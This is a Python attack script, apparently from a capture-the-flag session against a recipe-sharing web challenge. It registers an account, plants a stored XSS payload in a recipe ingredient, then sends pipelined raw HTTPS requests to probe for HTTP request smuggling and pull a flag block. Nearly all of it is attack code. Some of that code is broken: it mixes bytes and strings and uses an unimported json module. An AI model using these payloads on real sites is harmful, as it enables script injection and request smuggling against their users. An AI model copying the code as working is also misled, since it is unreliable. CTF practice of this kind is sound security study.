#!/usr/bin/env python3
"""Simplified HTTP smuggling probe: look for any anomaly in server responses that suggests
mis-parsing of request boundaries or header injection."""
import sys,time,socket,ssl,re;sys.path.insert(0,'.')
from cc import Client
BASE="https://tomorrow.web.2026.sunshinectf.games"
def w(*a):sys.stdout.buffer.write((" ".join(str(x) for x in a)+"\n").encode("utf-8","replace"));sys.stdout.flush()
w("=== registering ===")
c=Client();code,out,_=c.post("/register",{"username":"qs%04d"%(time.time()%10000),"password":"Passw0rd!"});u=out["user"]
code,out,_=c.post("/api/recipe",{"title":"s","ingredients":[{"name":"xss","value":"</script><script>alert('got')</script>"}]})
rid=out["id"];c.post("/api/recipe/%s/submit"%rid,{});time.sleep(7);c.post("/login",{"username":u,"password":"Passw0rd!"})
session=c.jar.get("session");role=c.jar.get("role")
if not session:w("No session");sys.exit(1)
# Try two requests back-to-back on one connection and see if second leaks into first response
ctx=ssl.create_default_context()
s=ctx.wrap_socket(socket.create_connection((BASE.split("//")[1],443),timeout=25),server_hostname=BASE.split("//")[1])
req1=b"GET /review/"+rid+b"\r\nHost: "+BASE.split("//")[1]+b"\r\nCookie: session="+session+"; role="+role+"\r\n\r\n"
s.sendall(req1)
req2=b"POST /api/seal HTTP/1.1\r\nHost: "+BASE.split("//")[1]+b"\r\nContent-Type: application/json\r\nContent-Length: 50\r\n\r\n"+json.dumps({"recipeId":rid}).encode()
time.sleep(0.5);s.sendall(req2)
time.sleep(3)
resp=s.recv(8192)
s.close()
w("Response length:",len(resp))
w("Has seal error?",b"seal" in resp.lower())
w("Has alert script?",b"<script>alert" in resp.lower())
if re.search(rb'class="seal gold"|class="flag"',resp):
    print("!!! GOLDEN BLOCK FOUND IN RAW RESPONSE")
    open("../files/smuggle_golden.html","wb").write(resp)
else:
    w("No golden block in raw response")
w("Done")
PYEOF
python -u smuggle.py 2>&1 | head -15